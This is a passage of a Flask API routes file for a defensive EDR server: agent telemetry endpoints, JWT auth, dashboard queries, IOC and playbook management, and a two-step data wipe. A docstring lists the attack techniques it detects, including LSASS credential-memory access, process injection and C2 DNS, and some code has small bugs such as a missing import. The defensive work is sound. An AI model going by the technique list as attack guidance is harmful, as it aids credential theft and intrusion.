# server/routes/api.py — All REST + SSE endpoints (commercial-grade)
"""
Agent endpoints  (require API-Key header):
  POST /register          agent registration
  POST /heartbeat         keep-alive
  POST /events            push process events → 7-layer + IOC analysis
  POST /dll_events        push DLL load events → L9 hijacking detection
  POST /net_events        push network events  → L6 beaconing detection
  POST /file_events       push file sys events → L7 ransomware detection
  GET  /commands/<sid>    poll for C2 commands
  POST /commands/result   report command result

Auth endpoints  (public):
  POST /auth/login        get JWT token
  GET  /auth/me           current user info (requires JWT)

User management  (require JWT admin role):
  GET  /auth/users        list users
  POST /auth/users        create user
  DELETE /auth/users/<u>  delete user

Dashboard endpoints  (require JWT viewer+):
  POST /api/command       send C2 command        (analyst+)
  GET  /api/events        query events
  GET  /api/systems       list systems
  GET  /api/stats         aggregate counters
  GET  /api/status        full dashboard payload
  GET  /api/graph/<sid>   process graph JSON
  GET  /api/alerts        paginated alerts
  GET  /api/audit         audit log              (admin only)
  GET  /api/iocs          list IOC feed
  POST /api/iocs          add an IOC             (analyst+)
  POST /api/clear         wipe all data          (admin only)
  GET  /api/export        export JSON/CSV        (analyst+)
  POST /simulate          inject attack scenario (analyst+)
  GET  /stream            SSE live alerts        (no auth — browser direct)
  GET  /health            liveness probe         (public)
"""
import json, time, csv, io, threading
from concurrent.futures import ThreadPoolExecutor
from flask import Blueprint, request, jsonify, Response, stream_with_context, g
import queue

from behedr_server.config import API_KEY, MAX_BATCH_SIZE, OFFLINE_THRESHOLD
from behedr_server.database.storage import (
    save_event, upsert_system, mark_stale, get_alert_stats,
    export_all, clear_all, get_event_count, get_pending_cmds,
    mark_cmd_done, queue_cmd, get_events, get_alerts,
    get_systems, get_systems_with_alert_counts, alert_count,
    write_audit, get_audit,
    add_suppression, remove_suppression, get_suppressions,
)
from behedr_server.database.incidents import (
    get_incidents, get_incident, update_incident_status,
    get_incident_alerts, incident_stats,
)
from behedr_server.core.processor import process, _seen_keys, _seen_fifo
from behedr_server.core.graph import add_event, _graphs
from behedr_server.core.detector import analyze, initialize as init_detector
from behedr_server.auth import (
    require_agent_key, require_jwt,
    authenticate, create_user, delete_user, get_users,
    change_password, get_password_policy, must_change_password,
)
from behedr_server.ratelimit import rate_limit, rate_limit_agent
from behedr_server.threatintel import check_ioc, add_ioc, load_iocs

api_bp  = Blueprint("api", __name__)
alert_q = queue.Queue(maxsize=500)
_pool   = ThreadPoolExecutor(max_workers=4, thread_name_prefix="AnalysisWorker")

from behedr_common.commands import VALID_COMMANDS
VALID_CMDS = VALID_COMMANDS


# ── Background stale-marker ───────────────────────────────────────────────────

def _stale_timer():
    while True:
        try:
            mark_stale(OFFLINE_THRESHOLD)
        except Exception as e:
            print(f"[STALE TIMER ERROR] {e}")
        time.sleep(10)

threading.Thread(target=_stale_timer, name="StaleTimer", daemon=True).start()


# ── Analysis pipeline ─────────────────────────────────────────────────────────

def _run_analysis(event):
    try:
        add_event(event)
        for alert in analyze(event):
            try:
                alert_q.put_nowait(alert)
            except queue.Full:
                pass
    except Exception as e:
        print(f"[ANALYSIS ERROR] {e}")


def _pipeline(raw):
    event = process(raw)
    if not event:
        return None
    save_event(event)
    _pool.submit(_run_analysis, event)
    return event


# ═════════════════════════════════════════════════════════════════════════════
# AUTH ENDPOINTS
# ═════════════════════════════════════════════════════════════════════════════

@api_bp.route("/auth/login", methods=["POST"])
@rate_limit("auth_login", per_minute=20)
def login():
    d        = request.get_json(silent=True) or {}
    username = d.get("username", "").strip()
    password = d.get("password", "")
    if not username or not password:
        return jsonify({"error": "username and password required"}), 400
    try:
        role, token = authenticate(username, password)
        write_audit(username, "login", "success", request.remote_addr)
        return jsonify({"token": token, "role": role, "username": username}), 200
    except ValueError:
        write_audit(username, "login", "failed", request.remote_addr)
        return jsonify({"error": "Invalid credentials"}), 401


@api_bp.route("/auth/me", methods=["GET"])
@require_jwt("viewer")
def me():
    return jsonify({"username": g.user, "role": g.role}), 200


@api_bp.route("/auth/users", methods=["GET"])
@require_jwt("admin")
def list_users():
    users = get_users()
    safe  = [{"username": u, "role": v["role"],
               "created": v.get("created", 0)} for u, v in users.items()]
    return jsonify({"users": safe}), 200


@api_bp.route("/auth/users", methods=["POST"])
@require_jwt("admin")
def add_user():
    d        = request.get_json(silent=True) or {}
    username = d.get("username", "").strip()
    password = d.get("password", "")
    role     = d.get("role", "analyst")
    if not username or not password:
        return jsonify({"error": "username and password required"}), 400
    if not create_user(username, password, role):
        return jsonify({"error": "User already exists or invalid role"}), 409
    write_audit(g.user, "create_user", username, request.remote_addr)
    return jsonify({"status": "created", "username": username, "role": role}), 201


@api_bp.route("/auth/users/<username>", methods=["DELETE"])
@require_jwt("admin")
def remove_user(username):
    if not delete_user(username):
        return jsonify({"error": "User not found or cannot delete admin"}), 404
    write_audit(g.user, "delete_user", username, request.remote_addr)
    return jsonify({"status": "deleted"}), 200


@api_bp.route("/auth/password", methods=["POST"])
@require_jwt("viewer")
@rate_limit("auth_password", per_minute=10)
def api_change_password():
    """Allow any logged-in user to change their own password."""
    d = request.get_json(silent=True) or {}
    new_password = d.get("new_password", "")
    if not new_password:
        return jsonify({"error": "new_password required"}), 400
    ok, err = change_password(g.user, new_password)
    if not ok:
        return jsonify({"error": err}), 400
    write_audit(g.user, "change_password", "success", request.remote_addr)
    return jsonify({"status": "password changed"}), 200


@api_bp.route("/auth/policy", methods=["GET"])
@require_jwt("viewer")
def api_password_policy():
    """Return the current password policy so the UI can validate client-side."""
    return jsonify(get_password_policy()), 200


# ═════════════════════════════════════════════════════════════════════════════
# AGENT ENDPOINTS  (shared API key)
# ═════════════════════════════════════════════════════════════════════════════

@api_bp.route("/register", methods=["POST"])
@require_agent_key
def register():
    d = request.get_json(silent=True) or {}
    if not d.get("system_id"):
        return jsonify({"error": "system_id required"}), 400
    d.setdefault("ip_address", request.remote_addr)
    upsert_system(d)
    print(f"[REGISTER] {d.get('system_id')} from {request.remote_addr}")
    return jsonify({"status": "registered"}), 200


@api_bp.route("/heartbeat", methods=["POST"])
@require_agent_key
def heartbeat():
    d = request.get_json(silent=True) or {}
    sid = d.get("system_id")
    if not sid:
        return jsonify({"error": "system_id required"}), 400
    upsert_system({"system_id": sid, "ip_address": request.remote_addr})

    # Record heartbeat for health monitoring
    try:
        from behedr_server.health_monitor import record_agent_heartbeat
        record_agent_heartbeat(sid)
    except Exception:
        pass  # Non-critical

    return jsonify({"status": "ok", "ts": int(time.time())}), 200


@api_bp.route("/events", methods=["POST"])
@require_agent_key
@rate_limit_agent("events", per_minute=500)
def recv_events():
    raw   = request.get_json(silent=True)
    if not raw:
        return jsonify({"error": "Invalid JSON"}), 400
    items = raw.get("events", [raw]) if isinstance(raw, dict) else [raw]
    items = items[:MAX_BATCH_SIZE]
    done  = sum(1 for i in items if _pipeline(i) is not None)
    return jsonify({"status": "ok", "processed": done}), 200


@api_bp.route("/dll_events", methods=["POST"])
@require_agent_key
@rate_limit_agent("dll_events", per_minute=300)
def recv_dll_events():
    """Receive DLL load events from agent — feeds L9 DLL hijacking detection."""
    raw = request.get_json(silent=True)
    if not raw:
        return jsonify({"error": "Invalid JSON"}), 400
    items = raw.get("events", [raw]) if isinstance(raw, dict) else [raw]
    processed = 0
    for item in items[:200]:
        if item.get("event") != "dll_load":
            continue
        try:
            from behedr_server.core.dll_monitor import add_dll_event
            add_dll_event(
                system_id=item.get("system_id", ""),
                process=item.get("process", ""),
                dll_name=item.get("dll_name", ""),
                dll_path=item.get("dll_path", ""),
                signed=item.get("signed", True),
            )
            processed += 1
        except Exception as e:
            print(f"[DLL EVENT ERROR] {e}")
    return jsonify({"status": "ok", "processed": processed}), 200


@api_bp.route("/net_events", methods=["POST"])
@require_agent_key
@rate_limit_agent("net_events", per_minute=300)
def recv_net_events():
    """Receive network connection events from agent — feeds L6 beaconing detection."""
    raw = request.get_json(silent=True)
    if not raw:
        return jsonify({"error": "Invalid JSON"}), 400
    items = raw.get("events", [raw]) if isinstance(raw, dict) else [raw]
    processed = 0
    for item in items[:500]:
        if item.get("event") != "network_connect":
            continue
        try:
            from behedr_server.core.detector import add_network_event
            add_network_event(
                system_id=item.get("system_id", ""),
                process=item.get("process", ""),
                dest_ip=item.get("remote_ip", ""),
                dest_port=int(item.get("remote_port", 0)),
                is_internal=bool(item.get("is_internal", False)),
            )
            processed += 1
        except Exception as e:
            print(f"[NET EVENT ERROR] {e}")
    return jsonify({"status": "ok", "processed": processed}), 200


@api_bp.route("/file_events", methods=["POST"])
@require_agent_key
@rate_limit_agent("file_events", per_minute=600)
def recv_file_events():
    """Receive file system events from agent — feeds L7 ransomware detection."""
    raw = request.get_json(silent=True)
    if not raw:
        return jsonify({"error": "Invalid JSON"}), 400
    items = raw.get("events", [raw]) if isinstance(raw, dict) else [raw]
    processed = 0
    for item in items[:500]:
        if item.get("event") != "file_event":
            continue
        system_id = item.get("system_id", "")
        process   = item.get("process", "unknown")
        file_path = item.get("file_path", "")
        action    = item.get("action", "modify")
        if not system_id or not file_path:
            continue
        try:
            from behedr_server.core.detector import add_file_event
            add_file_event(system_id, process, file_path, action)
            processed += 1
        except Exception as e:
            print(f"[FILE EVENT ERROR] {e}")
    return jsonify({"status": "ok", "processed": processed}), 200


@api_bp.route("/etw_events", methods=["POST"])
@require_agent_key
@rate_limit_agent("etw_events", per_minute=2000)
def recv_etw_events():
    """
    Receive ETW telemetry + Sysmon events from the agent.
    Routes each event type to the appropriate detection handler.

    ETW events (from etw_consumer.py / wevtutil fallback):
      etw_process_create  → full 13-layer analysis pipeline
      etw_thread_inject   → direct injection alert (T1055)
      etw_image_load      → DLL hijacking check (L9)
      etw_network_connect → L6 beaconing + lateral movement
      etw_registry_write  → registry abuse rules
      etw_dns_query       → C2 domain IOC check
      etw_scriptblock     → PowerShell content analysis (L1/L2/L4)
      etw_task_create     → scheduled task persistence
      etw_service_install → new service detection
      etw_account_change  → user account / group changes

    Sysmon events (from sysmon_reader.py — kernel-level):
      sysmon_inject       → Ev8  CreateRemoteThread      (T1055)
      sysmon_lsass_access → Ev10 LSASS memory access     (T1003.001)
      sysmon_dns          → Ev22 DNS query + IOC + DGA   (T1071.001)
      sysmon_pipe         → Ev17/18 Named pipe            (T1559 / CS)
      sysmon_hollowing    → Ev25 ProcessTampering         (T1055.012)
      sysmon_ads          → Ev15 Alternate Data Stream    (T1564.004)
      sysmon_registry     → Ev12/13 Registry persistence  (T1547.001)
      sysmon_network      → Ev3  NetworkConnect → L6+IOC
      sysmon_dll_load     → Ev7  ImageLoad → L9+hash
    """
    raw = request.get_json(silent=True)
    if not raw:
        return jsonify({"error": "Invalid JSON"}), 400
    items = raw.get("events", [raw]) if isinstance(raw, dict) else [raw]
    processed = 0

    for item in items[:1000]:
        etype     = item.get("event", "")
        system_id = item.get("system_id", "")
        if not system_id:
            continue
        try:
            from behedr_server.core.detector import handle_etw_event
            handle_etw_event(item)
            processed += 1
        except Exception as e:
            print(f"[ETW EVENT ERROR] {etype}: {e}")

    return jsonify({"status": "ok", "processed": processed}), 200


@api_bp.route("/yara_hits", methods=["POST"])
@require_agent_key
@rate_limit_agent("yara_hits", per_minute=200)
def recv_yara_hits():
    """
    Receive YARA memory scan hits from the agent.
    Each hit becomes a CRITICAL or HIGH alert in the detection engine.
    """
    raw = request.get_json(silent=True)
    if not raw:
        return jsonify({"error": "Invalid JSON"}), 400
    items = raw.get("events", [raw]) if isinstance(raw, dict) else [raw]
    processed = 0
    for item in items[:200]:
        if item.get("event") != "yara_hit":
            continue
        system_id = item.get("system_id", "")
        if not system_id:
            continue
        try:
            from behedr_server.core.detector import handle_yara_hit
            handle_yara_hit(item)
            processed += 1
        except Exception as e:
            print(f"[YARA HIT ERROR] {e}")
    return jsonify({"status": "ok", "processed": processed}), 200


@api_bp.route("/commands/<system_id>", methods=["GET"])
@require_agent_key
@rate_limit_agent("command_poll", per_minute=120)
def poll_commands(system_id):
    from behedr_server.response_policy import command_allowed
    commands = [cmd for cmd in get_pending_cmds(system_id) if command_allowed(cmd["action"])]
    return jsonify({"commands": commands}), 200


@api_bp.route("/commands/result", methods=["POST"])
@require_agent_key
def cmd_result():
    d   = request.get_json(silent=True) or {}
    cid = d.get("id")
    if not cid:
        return jsonify({"error": "Missing id"}), 400
    try:
        cid = int(cid)
        if cid <= 0:
            raise ValueError
    except (TypeError, ValueError):
        return jsonify({"error": "id must be a positive integer"}), 400
    mark_cmd_done(cid, str(d.get("result", "")))
    return jsonify({"status": "ok"}), 200


# ═════════════════════════════════════════════════════════════════════════════
# DASHBOARD ENDPOINTS  (JWT required)
# ═════════════════════════════════════════════════════════════════════════════

@api_bp.route("/api/command", methods=["POST"])
@require_jwt("analyst")
@rate_limit("api_command", per_minute=60)
def send_command():
    d         = request.get_json(silent=True) or {}
    system_id = d.get("system_id")
    action    = d.get("action")
    params    = d.get("params", {})
    if not system_id or not action:
        return jsonify({"error": "system_id and action required"}), 400
    if action not in VALID_CMDS:
        return jsonify({"error": f"Unknown action. Valid: {sorted(VALID_CMDS)}"}), 400
    from behedr_server.response_policy import command_allowed
    if not command_allowed(action):
        return jsonify({"error": "Command disabled in lab mode"}), 403
    cid = queue_cmd(system_id, action, params)
    write_audit(g.user, "send_command",
                f"{action} → {system_id}", request.remote_addr)
    return jsonify({"status": "queued", "id": cid}), 200


@api_bp.route("/api/events", methods=["GET"])
@require_jwt("viewer")
@rate_limit("api_events", per_minute=120)
def api_events():
    limit = min(int(request.args.get("limit", 200)), 1000)
    sid   = request.args.get("system_id")
    rows  = get_events(limit=limit, system_id=sid)
    return jsonify({"events": rows, "count": len(rows)}), 200


@api_bp.route("/api/systems", methods=["GET"])
@require_jwt("viewer")
def api_systems():
    return jsonify({"systems": get_systems()}), 200


@api_bp.route("/api/stats", methods=["GET"])
@require_jwt("viewer")
def api_stats():
    s = get_alert_stats()
    s["total_events"] = get_event_count()
    s["total_alerts"] = alert_count()
    return jsonify(s), 200


@api_bp.route("/api/storm_status", methods=["GET"])
@require_jwt("viewer")
def api_storm_status():
    """Get alert storm protection status for all systems."""
    try:
        from behedr_server.alert_storm_protection import get_storm_status
        status = get_storm_status()
        return jsonify(status), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/storm_reset", methods=["POST"])
@require_jwt("analyst")
def api_storm_reset():
    """Reset alert storm protection for a specific system or all systems."""
    try:
        from behedr_server.alert_storm_protection import reset_storm
        system_id = request.json.get("system_id") if request.json else None
        reset_storm(system_id)

        msg = f"Storm reset for {system_id}" if system_id else "Storm reset for all systems"
        write_audit(g.username, "storm_reset", msg, request.remote_addr)

        return jsonify({"status": "ok", "message": msg}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/alerts", methods=["GET"])
@require_jwt("viewer")
@rate_limit("api_alerts", per_minute=120)
def api_alerts():
    limit = min(int(request.args.get("limit", 100)), 500)
    sid   = request.args.get("system_id")
    rows  = get_alerts(limit=limit, system_id=sid)
    return jsonify({"alerts": rows, "total": alert_count(sid)}), 200


# ── UBA endpoints ─────────────────────────────────────────────────────────────

@api_bp.route("/api/uba/users", methods=["GET"])
@require_jwt("viewer")
def api_uba_users():
    """List all users tracked by the UBA engine with baseline status."""
    try:
        from behedr_server.core.uba import get_all_users, get_uba_stats
        return jsonify({
            "users": get_all_users(),
            "stats": get_uba_stats(),
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/uba/users/<username>", methods=["GET"])
@require_jwt("viewer")
def api_uba_profile(username):
    """Get full behavioral profile for a specific user."""
    try:
        from behedr_server.core.uba import get_user_profile_api
        profile = get_user_profile_api(username)
        if not profile:
            return jsonify({"error": "User not found in UBA engine"}), 404
        return jsonify(profile), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Active Learning endpoints ─────────────────────────────────────────────────

@api_bp.route("/api/alerts/<int:alert_id>/feedback", methods=["POST"])
@require_jwt("analyst")
@rate_limit("alert_feedback", per_minute=60)
def api_alert_feedback(alert_id):
    """
    Submit analyst TP/FP feedback for an alert.
    Body: {"verdict": "true_positive"|"false_positive", "reason": "optional"}
    Triggers ML retraining after every 100 samples.
    """
    d       = request.get_json(silent=True) or {}
    verdict = d.get("verdict", "").strip()
    reason  = d.get("reason", "").strip()

    if verdict not in ("true_positive", "false_positive"):
        return jsonify({"error": "verdict must be 'true_positive' or 'false_positive'"}), 400

    try:
        from behedr_server.core.active_learning import record_feedback
        ok = record_feedback(alert_id, verdict, g.user, reason)
        if not ok:
            return jsonify({"error": "Failed to record feedback"}), 500
        write_audit(g.user, "alert_feedback",
                    f"alert={alert_id} verdict={verdict}", request.remote_addr)
        return jsonify({"status": "recorded", "alert_id": alert_id, "verdict": verdict}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/active_learning/stats", methods=["GET"])
@require_jwt("viewer")
def api_al_stats():
    """Return active learning accuracy stats and improvement over time."""
    try:
        from behedr_server.core.active_learning import get_accuracy_trend, get_stats
        return jsonify({
            "accuracy": get_accuracy_trend(),
            "stats":    get_stats(),
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/active_learning/suggestions", methods=["GET"])
@require_jwt("analyst")
def api_al_suggestions():
    """
    Return suppression suggestions based on false positive patterns.
    These are (system, process, reason_prefix) tuples with 3+ FP occurrences.
    """
    try:
        from behedr_server.core.active_learning import get_suppression_suggestions
        return jsonify({"suggestions": get_suppression_suggestions()}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/playbooks", methods=["GET"])
@require_jwt("viewer")
def api_playbooks():
    """List all playbooks and their current status / last-triggered time."""
    from behedr_server.playbooks import get_playbook_status
    return jsonify({"playbooks": get_playbook_status()}), 200


@api_bp.route("/api/mitre_heatmap", methods=["GET"])
@require_jwt("viewer")
@rate_limit("api_mitre", per_minute=60)
def api_mitre_heatmap():
    """
    Return technique frequency data for the MITRE ATT&CK heatmap.

    Query params:
      system_id — optional, filter to one endpoint

    Response:
    {
      "technique_hits": {
        "T1059.001": {"count": 12, "last_seen": 1700000000, "description": "..."},
        ...
      },
      "systems": ["PC-1", "PC-2", ...],
      "total_alerts": 45,
      "techniques_seen": 8
    }
    """
    sid = request.args.get("system_id", "").strip()

    # Pull all alerts (per-system or global) — technique field contains MITRE IDs
    # comma-separated e.g. "T1059.001, T1027"
    if sid:
        rows = get_alerts(limit=5000, system_id=sid)
    else:
        rows = get_alerts(limit=5000)

    # Aggregate technique frequencies
    hits: dict = {}   # technique_id → {count, last_seen, description}
    for row in rows:
        technique_raw = row.get("technique", "")
        if not technique_raw:
            continue
        # Techniques may be comma-separated
        techniques = [t.strip() for t in technique_raw.split(",") if t.strip()]
        ts     = int(row.get("timestamp", 0))
        reason = row.get("reason", "")[:60]

        for tech in techniques:
            if not tech.startswith("T"):
                continue
            if tech not in hits:
                hits[tech] = {"count": 0, "last_seen": 0, "description": reason}
            hits[tech]["count"] += 1
            if ts > hits[tech]["last_seen"]:
                hits[tech]["last_seen"] = ts
                hits[tech]["description"] = reason

    # System list for the dropdown
    systems = [s["system_id"] for s in get_systems()]

    return jsonify({
        "technique_hits":  hits,
        "systems":         systems,
        "total_alerts":    len(rows),
        "techniques_seen": len(hits),
    }), 200


@api_bp.route("/api/playbooks/<name>/enable", methods=["POST"])
@require_jwt("analyst")
def api_playbook_enable(name):
    """Enable or disable a playbook by name. Body: {\"enabled\": true/false}"""
    from behedr_server.config import DATA_DIR
    import yaml as _yaml
    d        = request.get_json(silent=True) or {}
    enabled  = bool(d.get("enabled", True))
    pb_file  = os.path.join(DATA_DIR, "playbooks.yaml")

    # Load existing custom config or create skeleton
    try:
        with open(pb_file, encoding="utf-8") as f:
            data = _yaml.safe_load(f) or {}
    except FileNotFoundError:
        data = {"playbooks": []}
    except Exception as e:
        return jsonify({"error": str(e)}), 500

    playbooks = data.setdefault("playbooks", [])
    entry = next((p for p in playbooks if p["name"] == name), None)
    if entry is None:
        # Copy from built-ins
        from behedr_server.playbooks import _BUILTIN
        builtin = next((p for p in _BUILTIN if p["name"] == name), None)
        if not builtin:
            return jsonify({"error": f"Unknown playbook: {name}"}), 404
        import copy
        entry = copy.deepcopy(builtin)
        playbooks.append(entry)

    entry["enabled"] = enabled
    try:
        with open(pb_file, "w", encoding="utf-8") as f:
            _yaml.dump(data, f, default_flow_style=False)
    except Exception as e:
        return jsonify({"error": f"Could not save: {e}"}), 500

    write_audit(g.user, f"playbook_{'enable' if enabled else 'disable'}",
                name, request.remote_addr)
    return jsonify({"status": "ok", "name": name, "enabled": enabled}), 200


@api_bp.route("/api/playbooks/<name>/run", methods=["POST"])
@require_jwt("analyst")
@rate_limit("api_playbook_run", per_minute=10)
def api_playbook_run(name):
    """
    Manually trigger a playbook for a specific system.
    Body: {\"system_id\": \"PC-NAME\"}
    """
    from behedr_server import config
    if config.LAB_MODE:
        return jsonify({"error": "Playbook execution disabled in lab mode"}), 403
    from behedr_server.playbooks import _get_playbooks, _execute_playbook
    d         = request.get_json(silent=True) or {}
    system_id = d.get("system_id", "").strip()
    if not system_id:
        return jsonify({"error": "system_id required"}), 400

    pb = next((p for p in _get_playbooks() if p["name"] == name), None)
    if not pb:
        return jsonify({"error": f"Unknown playbook: {name}"}), 404

    # Synthetic alert to satisfy the executor (analyst is manually triggering)
    synthetic_alert = {
        "system_id":  system_id,
        "process":    d.get("process", "unknown"),
        "risk_level": "CRITICAL",
        "technique":  d.get("technique", ""),
        "reason":     f"Manual trigger by {g.user}",
    }

    import threading
    threading.Thread(
        target=_execute_playbook,
        args=(pb, synthetic_alert),
        daemon=True).start()

    write_audit(g.user, "playbook_manual_run",
                f"{name} → {system_id}", request.remote_addr)
    return jsonify({
        "status":    "triggered",
        "playbook":  name,
        "system_id": system_id,
        "actions":   [s.get("action") for s in pb.get("actions", [])],
    }), 200


# ═════════════════════════════════════════════════════════════════════════════
# PRIORITY 3/4 ENDPOINTS: Active Learning, UBA, Memory Forensics, Lateral Movement
# ═════════════════════════════════════════════════════════════════════════════

@api_bp.route("/api/feedback/<int:alert_id>", methods=["POST"])
@require_jwt("analyst")
def api_alert_feedback_legacy(alert_id):
    """
    Submit analyst feedback for an alert (Active Learning).
    Body: {"verdict": "true_positive" | "false_positive", "reason": "optional"}
    """
    d = request.get_json(silent=True) or {}
    verdict = d.get("verdict", "").lower()
    reason = d.get("reason", "")

    if verdict not in ("true_positive", "false_positive"):
        return jsonify({"error": "verdict must be true_positive or false_positive"}), 400

    try:
        from behedr_server.core.active_learning import record_feedback
        success = record_feedback(alert_id, verdict, g.user, reason)

        if success:
            write_audit(g.user, "alert_feedback", f"Alert {alert_id}: {verdict}", request.remote_addr)
            return jsonify({"status": "recorded", "alert_id": alert_id, "verdict": verdict}), 200
        else:
            return jsonify({"error": "Invalid verdict"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/feedback/stats", methods=["GET"])
@require_jwt("viewer")
def api_feedback_stats():
    """Get active learning statistics and accuracy trends."""
    try:
        from behedr_server.core.active_learning import get_stats, get_accuracy_trend
        return jsonify({
            "stats": get_stats(),
            "accuracy_trend": get_accuracy_trend(),
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/feedback/suggestions", methods=["GET"])
@require_jwt("analyst")
def api_suppression_suggestions():
    """Get AI-suggested suppressions based on false positive patterns."""
    try:
        from behedr_server.core.active_learning import get_suppression_suggestions
        suggestions = get_suppression_suggestions()
        return jsonify({"suggestions": suggestions}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/uba/user/<username>", methods=["GET"])
@require_jwt("viewer")
def api_uba_user_profile(username):
    """Get detailed behavioral profile for a specific user."""
    try:
        from behedr_server.core.uba import get_user_profile_api
        profile = get_user_profile_api(username)

        if profile:
            return jsonify(profile), 200
        else:
            return jsonify({"error": "User not found"}), 404
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/uba/stats", methods=["GET"])
@require_jwt("viewer")
def api_uba_stats():
    """Get UBA statistics."""
    try:
        from behedr_server.core.uba import get_uba_stats
        stats = get_uba_stats()
        return jsonify(stats), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@api_bp.route("/api/memory_forensics/stats", methods=["GET"])
@require_jwt("viewer")
def api_memory_forensics_stats():
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/lateral_movement/timeline", methods=["GET"])
@require_jwt("viewer")
def api_lateral_movement_timeline():
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/lateral_movement/stats", methods=["GET"])
@require_jwt("viewer")
def api_lateral_movement_stats():
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/lateral_movement/campaigns", methods=["GET"])
@require_jwt("viewer")
def api_coordinated_attacks():
    return jsonify({"available": False, "error": "Feature not implemented in this prototype"}), 503


@api_bp.route("/api/status", methods=["GET"])
@require_jwt("viewer")
def api_status():
    """Full dashboard payload — systems + recent alerts + events + stats."""
    systems_raw = get_systems_with_alert_counts()
    systems = [{
        "id":             s["system_id"],
        "hostname":       s["hostname"] or s["system_id"],
        "platform":       s["platform"] or "Unknown",
        "ip":             s["ip_address"] or "—",
        "agent_version":  s["agent_ver"] or "—",
        "status":         s["status"],
        "first_seen":     int(s.get("first_seen") or 0) * 1000,
        "last_seen":      int(s.get("last_seen")  or 0) * 1000,
        "alert_count":    s.get("alert_count",    0),
        "critical_count": s.get("critical_count", 0),
        "high_count":     s.get("high_count",     0),
        "medium_count":   s.get("medium_count",   0),
    } for s in systems_raw]

    limit = min(200, int(request.args.get("limit", 100)))

    def _ms(d):
        out = dict(d)
        for k in ("first_seen", "last_seen", "timestamp", "created_at", "executed_at"):
            if k in out and out[k]:
                out[k] = int(out[k]) * 1000
        return out

    stats = get_alert_stats()
    stats["total_events"] = get_event_count()
    stats["total_alerts"] = alert_count()

    return jsonify({
        "systems":      systems,
        "total_alerts": alert_count(),
        "total_events": get_event_count(),
        "stats":        stats,
        "alerts":       [_ms(a) for a in get_alerts(limit=limit)],
        "events":       [_ms(e) for e in get_events(limit=limit)],
    })


@api_bp.route("/api/graph/<system_id>", methods=["GET"])
@require_jwt("viewer")
def api_graph(system_id):
    from behedr_server.core.graph import to_json
    return jsonify(to_json(system_id))


@api_bp.route("/api/audit", methods=["GET"])
@require_jwt("admin")
def api_audit():
    limit = min(int(request.args.get("limit", 200)), 1000)
    rows  = get_audit(limit=limit)
    return jsonify({"audit": rows, "count": len(rows)}), 200


# ── IOC management ────────────────────────────────────────────────────────────

@api_bp.route("/api/iocs", methods=["GET"])
@require_jwt("viewer")
def list_iocs():
    import json as _json
    from behedr_server.config import IOC_FILE
    try:
        with open(IOC_FILE, encoding="utf-8") as f:
            iocs = _json.load(f)
    except Exception:
        iocs = []
    return jsonify({"iocs": iocs, "count": len(iocs)}), 200


@api_bp.route("/api/iocs", methods=["POST"])
@require_jwt("analyst")
def add_ioc_endpoint():
    d        = request.get_json(silent=True) or {}
    ioc_type = d.get("type", "").lower()
    value    = d.get("value", "").strip()
    label    = d.get("label", "Manual IOC")
    severity = d.get("severity", "HIGH").upper()
    if not ioc_type or not value:
        return jsonify({"error": "type and value required"}), 400
    if ioc_type not in ("sha256", "md5", "ipv4", "domain", "name"):
        return jsonify({"error": "type must be sha256, md5, ipv4, domain, or name"}), 400
    if severity not in ("LOW", "MEDIUM", "HIGH", "CRITICAL"):
        return jsonify({"error": "severity must be LOW, MEDIUM, HIGH, or CRITICAL"}), 400
    add_ioc(ioc_type, value, label, severity, f"manual:{g.user}")
    write_audit(g.user, "add_ioc", f"{ioc_type}:{value}", request.remote_addr)
    return jsonify({"status": "added", "type": ioc_type, "value": value}), 201


# ── Data management ───────────────────────────────────────────────────────────

# In-memory store for pending clear tokens: {token: (username, expires_at)}
import secrets as _secrets
_clear_tokens: dict = {}
_clear_tokens_lock = threading.Lock()
_CLEAR_TOKEN_TTL = 120   # token valid for 2 minutes only


@api_bp.route("/api/clear/request", methods=["POST"])
@require_jwt("admin")
def api_clear_request():
    """
    Step 1 of 2-step clear: request a one-time delete token.
    Returns a short-lived token that must be submitted to /api/clear/confirm
    within 2 minutes to proceed.  Reason for this design:
      - A single stolen admin JWT cannot silently wipe all evidence.
      - The analyst must make two separate, intentional HTTP calls.
      - The token expires so it cannot be replayed later.
    """
    token = _secrets.token_urlsafe(32)
    expires = time.time() + _CLEAR_TOKEN_TTL
    with _clear_tokens_lock:
        # Purge expired tokens first
        now = time.time()
        expired = [t for t, (_, exp) in _clear_tokens.items() if exp < now]
        for t in expired:
            del _clear_tokens[t]
        # Store new token
        _clear_tokens[token] = (g.user, expires)

    write_audit(g.user, "clear_request", "delete token issued", request.remote_addr)
    print(f"[CLEAR-REQUEST] Delete token issued for {g.user} — expires in {_CLEAR_TOKEN_TTL}s")
    return jsonify({
        "status":  "token_issued",
        "message": "Submit this token to POST /api/clear/confirm within 2 minutes to wipe all data.",
        "token":   token,
        "expires_in_seconds": _CLEAR_TOKEN_TTL,
    }), 200


@api_bp.route("/api/clear/confirm", methods=["POST"])
@require_jwt("admin")
def api_clear():
    """
    Step 2 of 2-step clear: submit the token from /api/clear/request.
    Body: { "token": "<token>", "confirm": "yes" }
    Also exports a backup archive AND creates DB backup before wiping.
    """
    d = request.get_json(silent=True) or {}

    if d.get("confirm") != "yes":
        return jsonify({"error": 'Send {"confirm":"yes","token":"<token>"} to confirm'}), 400

    submitted_token = d.get("token", "").strip()
    if not submitted_token:
        return jsonify({"error": "token required — call POST /api/clear/request first"}), 400

    with _clear_tokens_lock:
        entry = _clear_tokens.pop(submitted_token, None)

